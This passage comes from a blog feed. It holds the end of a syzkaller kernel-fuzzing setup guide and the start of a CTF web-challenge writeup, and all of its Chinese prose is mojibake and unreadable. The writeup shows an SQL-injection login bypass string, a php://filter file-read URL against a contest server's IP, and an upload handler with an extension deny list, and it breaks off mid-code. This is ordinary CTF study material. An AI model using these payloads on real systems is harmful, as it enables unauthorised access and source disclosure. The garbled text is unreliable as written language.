æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸï¼Œé¡ºä¾¿æ£€æŸ¥ä¸€ä¸‹go env</span>go <span class="hljs-built_in">env</span></code></pre><h2 id="2-å®‰è£…syzkaller"><a href="#2-å®‰è£…syzkaller" class="headerlink" title="2 å®‰è£…syzkaller"></a>2 å®‰è£…syzkaller</h2><ul><li>æºç ç¼–è¯‘å®‰è£…syzkaller</li></ul><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/google/syzkaller.git<span class="hljs-built_in">cd</span> syzkaller<span class="hljs-comment"># è¿™ä¸€æ­¥å¯¹å†…å­˜æœ‰è¦æ±‚ã€‚åœ¨è™šæ‹Ÿæœºä¸­åˆ†é…4Gä»¥ä¸Šå†…å­˜+4G swapå¯ä»¥æˆåŠŸç¼–è¯‘ã€‚</span>make<span class="hljs-comment"># makeæ— æŠ¥é”™ä¸”åœ¨syzkaller/binç›®å½•ä¸‹çœ‹åˆ°ç›¸å…³äºŒè¿›åˆ¶å³å®‰è£…æˆåŠŸ</span></code></pre><h2 id="3-ç¼–è¯‘å†…æ ¸"><a href="#3-ç¼–è¯‘å†…æ ¸" class="headerlink" title="3 ç¼–è¯‘å†…æ ¸"></a>3 ç¼–è¯‘å†…æ ¸</h2><ul><li>ä¸‹è½½å†…æ ¸æºç </li></ul><p>åœ¨ <a href="https://mirrors.edge.kernel.org/pub/linux/kernel/">https://mirrors.edge.kernel.org/pub/linux/kernel/</a> é€‰æ‹©æƒ³è¦æµ‹è¯•çš„å†…æ ¸ç‰ˆæœ¬ï¼ˆæ‹‰æœ€æ–°çš„å§ï¼‰</p><pre><code class="hljs bash">wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.1.12.tar.xztar xvJf linux-6.1.12.tar.xz</code></pre><ul><li>ç¼–è¯‘å†…æ ¸</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># ç”Ÿæˆç¼–è¯‘é…ç½®</span><span class="hljs-built_in">cd</span> linux-6.1.12make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> defconfigmake CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> kvm_guest.config<span class="hljs-comment"># åœ¨.configæ–‡ä»¶è¿½åŠ å¦‚ä¸‹å†…å®¹</span>CONFIG_KCOV=yCONFIG_DEBUG_INFO=yCONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT=y <span class="hljs-comment"># å·¨å‘ï¼Œåœ¨é«˜ç‰ˆæœ¬ä¸­è¿˜éœ€å¼€å¯æ­¤é€‰é¡¹ï¼Œå¦åˆ™DEBUG_INFOä¼šè‡ªåŠ¨è¢«DEBUG_INFO_NONEè¦†ç›–</span>CONFIG_KASAN=yCONFIG_KASAN_INLINE=yCONFIG_KCOV_INSTRUMENT_ALL=yCONFIG_KCOV_ENABLE_COMPARISONS=y <span class="hljs-comment"># è¦æ±‚gcc8+</span>CONFIG_CONFIGFS_FS=yCONFIG_SECURITYFS=yCONFIG_DEBUG_KMEMLEAK=yCONFIG_STACKTRACE=y<span class="hljs-comment"># UBSANï¼Œä¸å¯ä»¥(å’Œå“ªäº›é€‰é¡¹?)ä¸€èµ·ç”¨ï¼Œä¼šæŠ¥makeç¼–è¯‘é”™è¯¯ã€‚</span>CONFIG_UBSAN=yCONFIG_UBSAN_SANITIZE_ALL=y<span class="hljs-comment"># è‹¥æƒ³é¿å…åç»­è¿è¡Œsyzkallerçš„æ—¶å€™å‡ºç°[FAILED] Failed to start Raise network interfaces.çš„é”™è¯¯ï¼Œå†è¿½åŠ ä»¥ä¸‹ä¸¤è¡Œ</span>CONFIG_CMDLINE_BOOL=yCONFIG_CMDLINE=<span class="hljs-string">&quot;net.ifnames=0&quot;</span><span class="hljs-comment"># å¯ç”¨é”™è¯¯æ³¨å…¥æŠ€æœ¯</span>CONFIG_FAULT_INJECTION=yCONFIG_FAULT_INJECTION_DEBUG_FS=yCONFIG_FAULT_INJECTION_USERCOPY=yCONFIG_FAILSLAB=yCONFIG_FAIL_PAGE_ALLOC=yCONFIG_FAIL_MAKE_REQUEST=yCONFIG_FAIL_IO_TIMEOUT=yCONFIG_FAIL_FUTEX=y<span class="hljs-comment"># å¼€å¯namespace sandboxingç›¸å…³çš„é€‰é¡¹</span>CONFIG_NAMESPACES=yCONFIG_UTS_NS=yCONFIG_IPC_NS=yCONFIG_PID_NS=yCONFIG_NET_NS=yCONFIG_CGROUP_PIDS=yCONFIG_MEMCG=yCONFIG_USER_NS=y<span class="hljs-comment"># è¡¥å……ä¸€äº›è¢«è¯æ˜æœ‰ç”¨çš„é€‰é¡¹</span>CONFIG_LOCKDEP=yCONFIG_PROVE_LOCKING=yCONFIG_DEBUG_ATOMIC_SLEEP=yCONFIG_PROVE_RCU=yCONFIG_DEBUG_VM=yCONFIG_REFCOUNT_FULL=yCONFIG_FORTIFY_SOURCE=yCONFIG_HARDENED_USERCOPY=yCONFIG_LOCKUP_DETECTOR=yCONFIG_SOFTLOCKUP_DETECTOR=yCONFIG_HARDLOCKUP_DETECTOR=yCONFIG_BOOTPARAM_HARDLOCKUP_PANIC=yCONFIG_DETECT_HUNG_TASK=yCONFIG_WQ_WATCHDOG=yCONFIG_DEFAULT_HUNG_TASK_TIMEOUT=140CONFIG_RCU_CPU_STALL_TIMEOUT=100<span class="hljs-comment"># ç„¶åä½¿å¾—ä¸Šè¿°è¿½åŠ å†…å®¹ç”Ÿæ•ˆï¼Œæ³¨æ„è¿™å…­ä¸ªé€‰é¡¹çš„ä½ç½®ä¸å†ä½äºæ–‡ä»¶å°¾éƒ¨</span>make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> olddefconfig<span class="hljs-comment"># æœ€åå¼€å§‹ç¼–è¯‘å†…æ ¸ï¼ˆå¯¹å†…å­˜æœ‰ä¸€å®šè¦æ±‚ï¼Œæˆ‘åœ¨è™šæ‹Ÿæœºä¸­ç¼–è¯‘å¤±è´¥ï¼Œåœ¨å°å¼ç‰©ç†æœºä¸­5minç¼–è¯‘å®Œæ¯•ï¼‰</span>make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> -j8<span class="hljs-comment"># æœŸé—´å¹¶æ— æŠ¥é”™ä¸”æœ€åçœ‹åˆ°å¦‚ä¸‹è¾“å‡ºå³ç¼–è¯‘æˆåŠŸ</span><span class="hljs-comment"># Kernel: arch/x86/boot/bzImage is ready  (#1)</span></code></pre><ul><li>ä»¥ä¸‹æ˜¯<strong>(è¾ƒæ—©ä»¥å‰ï¼Œä¸å…·å‚è€ƒä»·å€¼)</strong>ä¸€æ¬¡è¿è¡Œæ—¥å¿—çš„å¼€å¤´éƒ¨åˆ†ï¼Œæ‰€æç¤ºnot enabledçš„å‡ ä¸ªconfigå·²ç»åŒ…å«åœ¨ä¸Šè¿°é…ç½®é‡Œã€‚</li></ul><pre><code class="hljs bash">2022/12/30 03:01:42 code coverage           : enabled2022/12/30 03:01:42 comparison tracing      : CONFIG_KCOV_ENABLE_COMPARISONS is not enabled2022/12/30 03:01:42 extra coverage          : enabled2022/12/30 03:01:42 delay kcov mmap         : enabled2022/12/30 03:01:42 setuid sandbox          : enabled2022/12/30 03:01:42 namespace sandbox       : /proc/self/ns/user does not exist2022/12/30 03:01:42 Android sandbox         : enabled2022/12/30 03:01:42 fault injection         : CONFIG_FAULT_INJECTION is not enabled2022/12/30 03:01:42 leak checking           : CONFIG_DEBUG_KMEMLEAK is not enabled2022/12/30 03:01:42 net packet injection    : /dev/net/tun does not exist2022/12/30 03:01:42 net device setup        : enabled2022/12/30 03:01:42 concurrency sanitizer   : /sys/kernel/debug/kcsan does not exist2022/12/30 03:01:42 devlink PCI setup       : PCI device 0000:00:10.0 is not available2022/12/30 03:01:42 NIC VF setup            : PCI device 0000:00:11.0 is not available2022/12/30 03:01:42 USB emulation           : /dev/raw-gadget does not exist2022/12/30 03:01:42 hci packet injection    : /dev/vhci does not exist2022/12/30 03:01:42 wifi device emulation   : /sys/class/mac80211_hwsim/ does not exist2022/12/30 03:01:42 802.15.4 emulation      : /sys/bus/platform/devices/mac802154_hwsim does not exist2022/12/30 03:01:42 corpus                  : 0 (deleted 0 broken)2022/12/30 03:01:44 seeds                   : 165/685</code></pre><h2 id="4-åˆ›å»ºè™šæ‹Ÿæœº"><a href="#4-åˆ›å»ºè™šæ‹Ÿæœº" class="headerlink" title="4 åˆ›å»ºè™šæ‹Ÿæœº"></a>4 åˆ›å»ºè™šæ‹Ÿæœº</h2><ul><li>åˆ›å»ºimageï¼ˆ<strong>æ³¨æ„</strong>ï¼Œè‡ª2023-04-12 syzkallerçš„<a href="https://github.com/google/syzkaller/commit/d4d447cd780753901f9e00aa246cc835458a8f06">d4d447c</a> commitä¹‹åï¼Œ<strong>create-image.shä¸­çš„é»˜è®¤releaseç”±stretchå˜æ›´ä¸ºäº†bullseye</strong>ï¼‰</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># åœ¨åˆ›å»ºä¸€ä¸ªimageç›®å½•</span><span class="hljs-built_in">mkdir</span> image &amp;&amp; <span class="hljs-built_in">cd</span> image<span class="hljs-built_in">cp</span> ../syzkaller/tools/create-image.sh ./<span class="hljs-built_in">chmod</span> u+x create-image.sh<span class="hljs-comment"># debiançš„é•œåƒå¤ªæ…¢äº†ï¼Œå¯åˆ‡æ¢åˆ°æ¸…åæº https://mirrors.tuna.tsinghua.edu.cn/debian/</span>sed -i <span class="hljs-string">&#x27;s/http:\/\/deb.debian.org\/debian-ports/https:\/\/mirrors.tuna.tsinghua.edu.cn\/debian\//g&#x27;</span> create-image.sh./create-image.sh<span class="hljs-comment"># çœ‹åˆ°å¦‚ä¸‹warningæ˜¯æ­£å¸¸ç°è±¡ï¼Œè¯´æ˜æ²¡æœ‰debian-archive-keyringï¼Œå¦‚æœç½‘ç»œæ­£å¸¸å¯ä»¥æŒ‰ç…§å…¶æ›¿ä»£æ–¹æ¡ˆåˆ‡æ¢åˆ°mirror https://deb.debian.org/debianå¹¶ç»§ç»­æ‰§è¡Œ</span><span class="hljs-comment"># I: Keyring file not available at /usr/share/keyrings/debian-archive-keyring.gpg; switching to https mirror https://deb.debian.org/debian</span><span class="hljs-comment"># ä¹Ÿå¯ä»¥é€šè¿‡å®‰è£…debian-archive-keyringæ¥é¿å…è¯¥warningï¼ˆå¯é€‰ï¼‰</span><span class="hljs-built_in">sudo</span> apt install -y debian-archive-keyring<span class="hljs-comment"># æ‰§è¡Œcreate-image.shå®Œæ¯•åçœ‹åˆ°ç›®å½•æœ‰å¦‚ä¸‹å†…å®¹å³ä¸ºæˆåŠŸ</span><span class="hljs-built_in">chroot</span>  create-image.sh  stretch.id_rsa  stretch.id_rsa.pub  stretch.img<span class="hljs-comment"># 2023-05-04è¡¥å……è¯´æ˜ï¼šæœ€æ–°ç‰ˆcreate-image.shæ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œéšåä¸ä¹‹ç›¸å…³çš„boot.shå’Œmy.cfgä¸­çš„stretch*éƒ½è¦æ”¹ä¸ºbullseye*</span><span class="hljs-built_in">chroot</span>  create-image.sh  bullseye.id_rsa  bullseye.id_rsa.pub  bullseye.img</code></pre><ul><li>å®‰è£…qemuè™šæ‹Ÿæœº</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># åœ¨å½“å‰imageç›®å½•åˆ›å»ºboot.shï¼Œæ³¨æ„è·¯å¾„çš„æŒ‡å‘è¦æ­£ç¡®</span><span class="hljs-comment"># x86_64/boot/bzImageæ˜¯x86/boot/bzImageçš„è½¯é“¾æ¥</span>qemu-system-x86_64 \ -kernel ../kernels/linux-6.1.12/arch/x86/boot/bzImage \ -append <span class="hljs-string">&quot;console=ttyS0 root=/dev/sda debug earlyprintk=serial slub_debug=QUZ&quot;</span>\ -hda ./bullseye.img \ -net user,hostfwd=tcp::16112-:22 -net nic   \ -enable-kvm \ -nographic \ -m 2560M \ -smp 2 \ -pidfile vm.pid \ 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> vm.log <span class="hljs-comment"># è¿è¡Œboot.shå¯åŠ¨è™šæ‹Ÿæœºï¼Œä»¥rootç”¨æˆ·æ— å¯†ç ç™»å½•</span><span class="hljs-built_in">chmod</span> u+x boot.sh./boot.sh<span class="hljs-comment"># ç„¶åæµ‹è¯•qemuè™šæ‹Ÿæœºçš„sshæœåŠ¡æ˜¯å¦æˆåŠŸå¯åŠ¨</span>ssh -i bullseye.id_rsa -p 16112 -o <span class="hljs-string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</code></pre><h2 id="5-è¿è¡Œsyzkaller"><a href="#5-è¿è¡Œsyzkaller" class="headerlink" title="5 è¿è¡Œsyzkaller"></a>5 è¿è¡Œsyzkaller</h2><ul><li>åˆ›å»ºsyzkalleré…ç½®æ–‡ä»¶</li></ul><p><strong>æ³¨æ„ï¼šä¸ºäº†é¿å…å‡ºç°[FAILED] Failed to start Raise network interfaces.çš„é”™è¯¯ï¼Œè¦åœ¨ä¸‹è¿°é…ç½®æ–‡ä»¶åŠ å…¥â€cmdlineâ€: â€œnet.ifnames=0â€æˆ–è€…åœ¨.configä¸­è¿½åŠ CMDLINEç›¸å…³çš„ä¸¤æ¡é…ç½®é¡¹</strong></p><pre><code class="hljs bash"><span class="hljs-comment"># åœ¨syzkallerç›®å½•ä¸‹åˆ›å»ºworkdir</span><span class="hljs-built_in">cd</span> syzkaller<span class="hljs-built_in">mkdir</span> workdir<span class="hljs-comment"># åœ¨syzkallerç›®å½•ä¸‹åˆ›å»ºmy.cfgï¼Œå„é€‰é¡¹å‡é‡‡ç”¨ç»å¯¹è·¯å¾„</span>&#123;    <span class="hljs-string">&quot;target&quot;</span>: <span class="hljs-string">&quot;linux/amd64&quot;</span>,    <span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;127.0.0.1:56741&quot;</span>,    <span class="hljs-string">&quot;workdir&quot;</span>: <span class="hljs-string">&quot;/home/zzy/kernel-fuzz/syzkaller/workdir&quot;</span>,    <span class="hljs-string">&quot;kernel_obj&quot;</span>: <span class="hljs-string">&quot;/home/zzy/kernel-fuzz/kernels/linux-6.1.12&quot;</span>,    <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;/home/zzy/kernel-fuzz/image/bullseye.img&quot;</span>,    <span class="hljs-string">&quot;sshkey&quot;</span>: <span class="hljs-string">&quot;/home/zzy/kernel-fuzz/image/bullseye.id_rsa&quot;</span>,    <span class="hljs-string">&quot;syzkaller&quot;</span>: <span class="hljs-string">&quot;/home/zzy/kernel-fuzz/syzkaller&quot;</span>,    <span class="hljs-string">&quot;procs&quot;</span>: 8,    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;qemu&quot;</span>,    <span class="hljs-string">&quot;vm&quot;</span>: &#123;        <span class="hljs-string">&quot;count&quot;</span>: 8,        <span class="hljs-string">&quot;kernel&quot;</span>: <span class="hljs-string">&quot;/home/zzy/kernel-fuzz/kernels/linux-6.1.12/arch/x86/boot/bzImage&quot;</span>,        <span class="hljs-comment"># &quot;cmdline&quot;: &quot;net.ifnames=0&quot;,</span>        <span class="hljs-comment"># &quot;cpu&quot;: 2,</span>        <span class="hljs-string">&quot;mem&quot;</span>: 2048    &#125;&#125;</code></pre><ul><li>å¼€å§‹å†…æ ¸æ¨¡ç³Šæµ‹è¯•</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># å°†æ—¥å¿—å†™å…¥./bench.log</span>./bin/syz-manager -config my.cfg -bench bench.log<span class="hljs-comment"># å¦‚æœå‡ºç°Is another process using the image [/home/zzy/kernel-fuzz/image/stretch.img]?æç¤º</span><span class="hljs-comment"># åˆ™è¯´æ˜ä¹‹å‰boot.shå¼€å¯çš„qemuè™šæ‹Ÿæœºå°šæœªå…³æœºï¼Œè¿›å…¥åˆ°è¯¥è™šæ‹Ÿæœºæ‰§è¡Œå…³æœºå‘½ä»¤poweroffå³å¯</span></code></pre><ul><li>åœ¨ <a href="http://localhost:56741/">http://localhost:56741/</a> æŸ¥çœ‹fuzzçš„è¿›åº¦å’Œç»“æœã€‚å…³äºweb uiç•Œé¢ä¸­coverageçš„æ•°æ®<code>P1%(P2%) of N1(N2)</code>çš„å«ä¹‰ï¼Œæˆ‘é€šè¿‡åˆ†ææºç <code>pkg/cover/html.go</code>ç†è§£äº†å®ƒä»¬çš„å«ä¹‰ã€‚</li></ul><pre><code class="hljs go"><span class="hljs-comment">// pkg/cover/html.go</span>...&#123;&#123;define <span class="hljs-string">&quot;dir&quot;</span>&#125;&#125;    &#123;&#123;<span class="hljs-keyword">range</span> $dir := .Dirs&#125;&#125;        &lt;li&gt;            &lt;span id=<span class="hljs-string">&quot;path/&#123;&#123;$dir.Path&#125;&#125;&quot;</span> class=<span class="hljs-string">&quot;caret hover&quot;</span>&gt;                &#123;&#123;$dir.Name&#125;&#125;                &lt;span class=<span class="hljs-string">&quot;cover hover&quot;</span>&gt;                    &#123;&#123;<span class="hljs-keyword">if</span> $dir.Covered&#125;&#125;&#123;&#123;$dir.Percent&#125;&#125;%(&#123;&#123;$dir.PercentInCoveredFunc&#125;&#125;%)&#123;&#123;<span class="hljs-keyword">else</span>&#125;&#125;---&#123;&#123;end&#125;&#125;                    &lt;span class=<span class="hljs-string">&quot;cover-right&quot;</span>&gt;of &#123;&#123;$dir.Total&#125;&#125;(&#123;&#123;$dir.TotalInCoveredFunc&#125;&#125;)&lt;/span&gt;                &lt;/span&gt;            &lt;/span&gt;            &lt;ul class=<span class="hljs-string">&quot;nested&quot;</span>&gt;                &#123;&#123;template <span class="hljs-string">&quot;dir&quot;</span> $dir&#125;&#125;            &lt;/ul&gt;        &lt;/li&gt;    &#123;&#123;end&#125;&#125;    &#123;&#123;<span class="hljs-keyword">range</span> $file := .Files&#125;&#125;        &lt;li&gt;&lt;span class=<span class="hljs-string">&quot;hover&quot;</span>&gt;            &#123;&#123;<span class="hljs-keyword">if</span> $file.Covered&#125;&#125;                &lt;a href=<span class="hljs-string">&quot;#&#123;&#123;$file.Path&#125;&#125;&quot;</span> id=<span class="hljs-string">&quot;path/&#123;&#123;$file.Path&#125;&#125;&quot;</span> onclick=<span class="hljs-string">&quot;onFileClick(&#123;&#123;$file.Index&#125;&#125;)&quot;</span>&gt;                    &#123;&#123;$file.Name&#125;&#125;                &lt;/a&gt;                &lt;span class=<span class="hljs-string">&quot;cover hover&quot;</span>&gt;                    &lt;a href=<span class="hljs-string">&quot;#&#123;&#123;$file.Path&#125;&#125;&quot;</span> id=<span class="hljs-string">&quot;path/&#123;&#123;$file.Path&#125;&#125;&quot;</span>                        onclick=<span class="hljs-string">&quot;&#123;&#123;if .HasFunctions&#125;&#125;onPercentClick&#123;&#123;else&#125;&#125;onFileClick&#123;&#123;end&#125;&#125;(&#123;&#123;$file.Index&#125;&#125;)&quot;</span>&gt;                                                &#123;&#123;$file.Percent&#125;&#125;%(&#123;&#123;$file.PercentInCoveredFunc&#125;&#125;%)                    &lt;/a&gt;                    &lt;span class=<span class="hljs-string">&quot;cover-right&quot;</span>&gt;of &#123;&#123;$file.Total&#125;&#125;(&#123;&#123;$file.TotalInCoveredFunc&#125;&#125;)&lt;/span&gt;                &lt;/span&gt;            &#123;&#123;<span class="hljs-keyword">else</span>&#125;&#125;                    &#123;&#123;$file.Name&#125;&#125;&lt;span class=<span class="hljs-string">&quot;cover hover&quot;</span>&gt;---&lt;span class=<span class="hljs-string">&quot;cover-right&quot;</span>&gt;                        of &#123;&#123;$file.Total&#125;&#125;&lt;/span&gt;&lt;/span&gt;            &#123;&#123;end&#125;&#125;        &lt;/span&gt;&lt;/li&gt;    &#123;&#123;end&#125;&#125;&#123;&#123;end&#125;&#125;...</code></pre><p>ç”±æ­¤å¯çŸ¥ï¼Œ<code>P1%</code>çš„å«ä¹‰æ˜¯<code>file.Percent</code><strong>å¤§æ¦‚æ˜¯PCè¦†ç›–å æ¯”</strong>ï¼Œå¯¹åº”<code>N1</code>ä¸º<code>file.Total</code><strong>PCè¦†ç›–æ€»æ•°</strong>ã€‚<code>P2%</code>çš„å«ä¹‰æ˜¯<code>file.PercentInCoveredFunc</code><strong>å‡½æ•°è¦†ç›–å æ¯”</strong>ï¼Œå¯¹åº”<code>N2</code>ä¸º<code>file.TotalInCoveredFunc</code><strong>å‡½æ•°è¦†ç›–æ€»æ•°</strong></p><p>ä¸Šé¢è¿™æ®µåˆ’æ‰ï¼Œæˆ‘è¿˜æ²¡ææ¸…æ¥šâ€¦</p><h2 id="6-è°ƒè¯•å†…æ ¸"><a href="#6-è°ƒè¯•å†…æ ¸" class="headerlink" title="6 è°ƒè¯•å†…æ ¸"></a>6 è°ƒè¯•å†…æ ¸</h2><p>å‚è§<a href="https://qgrain.github.io/2023/02/01/%E5%86%85%E6%A0%B8Fuzz%E6%8A%80%E5%B7%A7%E4%B8%8E%E5%A4%87%E5%BF%98/#qemu-gdb%E8%B0%83%E8%AF%95%E5%86%85%E6%A0%B8">å†…æ ¸FuzzæŠ€å·§ä¸å¤‡å¿˜: qemu+gdbè°ƒè¯•å†…æ ¸</a></p><h2 id="7-å‚è€ƒ"><a href="#7-å‚è€ƒ" class="headerlink" title="7 å‚è€ƒ"></a>7 å‚è€ƒ</h2><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md">[1] Setup: Ubuntu host, QEMU vm, x86-64 kernel</a></p><p><a href="https://zhuanlan.zhihu.com/p/506059739">[2] é›¶åŸºç¡€syzkalleræŒ–æ˜Linuxå†…æ ¸æ¼æ´</a></p><p><a href="http://pwn4.fun/2019/05/31/Syzkaller%E5%AE%89%E8%A3%85%20Fuzz%20Qemu%20amd64%20Kernel/">[3] Syzkallerå®‰è£… Fuzz Qemu amd64 Kernel</a></p><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/troubleshooting.md">[4] syzkallerå®˜æ–¹troubleshooting</a></p><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md">[5] syzkallerå®˜æ–¹kernel_configs</a></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
      <tag>Kernel</tag>
      
      <tag>Syzkaller</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NeSEä¸™å‡ä¹™CTFå‡çº§èµ›Writeup</title>
    <link href="/2022/10/03/%E4%B8%99%E5%8D%87%E4%B9%99CTF%E5%8D%87%E7%BA%A7%E8%B5%9Bwriteup/"/>
    <url>/2022/10/03/%E4%B8%99%E5%8D%87%E4%B9%99CTF%E5%8D%87%E7%BA%A7%E8%B5%9Bwriteup/</url>
    
    <content type="html"><![CDATA[<p>10æœˆ2æ—¥NeSEä¸™ç»„å‡ä¹™ç»„CTFå‡çº§èµ›Writeup</p><span id="more"></span><p>è¿˜æ˜¯Too naiveäº†ï¼Œåªåšå‡ºæ¥ä¸€é¢˜+ä¸¤ä¸ªåŠé¢˜</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h2><h3 id="1-ç™»å½•"><a href="#1-ç™»å½•" class="headerlink" title="1 ç™»å½•"></a>1 ç™»å½•</h3><p>é¦–å…ˆæ˜¯ä¸€ä¸ªç³»ç»Ÿç™»å½•ç•Œé¢ï¼Œç›´æ¥å°è¯•è¯¸å¦‚adminï¼Œtestæç¤ºç”¨æˆ·åå¯†ç é”™è¯¯ä¹‹åï¼Œé‡‡ç”¨ç»•è¿‡å¯†ç åˆ¤æ–­<code>admin&#39; or 1=1#</code>æˆåŠŸç™»å½•ã€‚ï¼ˆè™½ç„¶åæ¥ä¸çŸ¥é“è°æŠŠadminå¯†ç ç½®ç©ºäº†ï¼Œå¯ä»¥ç›´æ¥ç™»å½•adminï¼Œä½†å½±å“ä¸å¤§ï¼Œä¸ç®¡ç”¨ä»€ä¹ˆè´¦æˆ·ç™»å½•éƒ½å¯ä»¥è¿›è¡Œåç»­çš„æ–‡ä»¶ä¸Šä¼ ï¼‰</p><div align=center>  <img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061142953.png" style="zoom:67%;"/></div><h3 id="2-åˆ†æ"><a href="#2-åˆ†æ" class="headerlink" title="2 åˆ†æ"></a>2 åˆ†æ</h3><p>åœ¨é¦–é¡µ<code>ç»¼åˆç®¡ç†</code>ä¹±ç‚¹ä¸€é€šæ— æœä¹‹åï¼Œåˆ‡æ¢åˆ°<code>ç”¨æˆ·åˆ—è¡¨</code>ï¼Œçœ‹åˆ°æœ‰æ‰€æœ‰ç”¨æˆ·ä¸ªäººä¿¡æ¯ï¼š</p><!-- è®©è¡¨æ ¼å±…ä¸­æ˜¾ç¤ºçš„é£æ ¼ --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><div class="center">|  ID  | User |            EmailAddress             | LastLogin           || :--: | :--: | :---------------------------------: | ------------------- ||  1   | ads  | [qqq@mail.com](mailto:qqq@mail.com) | 2019-08-07 13:00:00 |</div><p>ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œæ‹‰åˆ°æœ€åº•ä¸‹å‘ç°æœ‰æç¤º</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061143978.png" style="zoom:50%;" /></p><p>æ˜¯æç¤º<strong>Please input â€œ?f=aab.phpâ€</strong>ï¼Œåº”è¯¥æ˜¯å¯ä»¥åŒ…å«ä»»æ„æ–‡ä»¶ã€‚ç»§ç»­åˆ‡åˆ°<code>ä¿®æ”¹ä¸ªäººä¿¡æ¯</code>ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹ç®¡ç†å‘˜ä¸ªäººä¿¡æ¯ï¼Œæ­¤å¤„å¯åˆ©ç”¨å¤´åƒä¸Šä¼ æ–‡ä»¶ã€‚ç„¶åç»“åˆä¹‹å‰çš„æç¤º<code>?f=*php</code>å’Œphpä¼ªåè®®è¯»å–æºç </p><pre><code class="hljs bash"><span class="hljs-comment"># é¦–å…ˆé€šè¿‡php://filterè¯»å–ç›®æ ‡æºç çš„base64</span>http://124.16.75.162:31010/table.php?f=php://filter/read=convert.base64-encode/resource=/var/www/html/info.php<span class="hljs-comment"># ç„¶åå†base64è§£ç å¾—åˆ°æºç </span></code></pre><ul><li>info.phpï¼ˆå…³é”®éƒ¨åˆ†æºç ï¼‰</li></ul><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;address&#x27;</span>])) &#123;    ...    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>)) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;é”™è¯¯ï¼š&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deldot</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;                <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>)-<span class="hljs-number">1</span>;<span class="hljs-variable">$i</span>&gt;<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>--)&#123;                    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$s</span>,<span class="hljs-variable">$i</span>,<span class="hljs-number">1</span>);                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span> == <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>)-<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$c</span> != <span class="hljs-string">&#x27;.&#x27;</span>)&#123;                        <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;                    &#125;                         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$c</span> != <span class="hljs-string">&#x27;.&#x27;</span>)&#123;                        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$s</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>);                    &#125;                &#125;            &#125;            <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span 